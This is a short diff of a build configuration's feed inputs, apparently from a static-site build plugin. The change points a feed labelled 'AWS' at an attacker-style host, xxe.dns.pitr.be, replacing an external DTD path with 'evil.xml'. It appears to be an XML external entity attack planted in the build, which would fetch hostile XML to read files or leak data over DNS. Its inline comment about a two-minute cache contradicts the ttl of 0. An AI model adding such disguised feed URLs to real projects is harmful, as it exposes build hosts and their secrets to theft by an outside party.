@@ -18,5 +18,5 @@
 # All the feeds we wish to gather for use in the build
     [[plugins.inputs.feeds]]
       name = "AWS"
-      url = "http://xxe.dns.pitr.be/xxe/ext.dtd"
+      url = "http://xxe.dns.pitr.be/xxe/evil.xml"
       ttl = 0   # Cache for 2 minutes
